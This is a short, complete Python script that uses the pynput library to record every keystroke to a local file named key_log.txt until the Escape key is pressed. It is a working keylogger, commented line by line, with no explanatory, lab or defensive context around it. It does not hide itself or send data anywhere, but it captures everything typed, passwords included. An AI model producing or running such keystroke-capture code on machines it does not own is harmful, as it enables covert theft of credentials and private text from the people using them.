from pynput.keyboard import Key, Listener

# Define the file where the key logs will be stored
log_file = "key_log.txt"

def on_press(key):
    # Convert the key to a string and log it to the file
    with open(log_file, "a") as file:
        try:
            file.write(str(key.char))
        except AttributeError:
            if key == Key.space:
                file.write(" ")
            elif key == Key.enter:
                file.write("\n")
            else:
                file.write(f" [{key}] ")

def on_release(key):
    # Stop the listener if the 'esc' key is pressed
    if key == Key.esc:
        return False

# Set up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
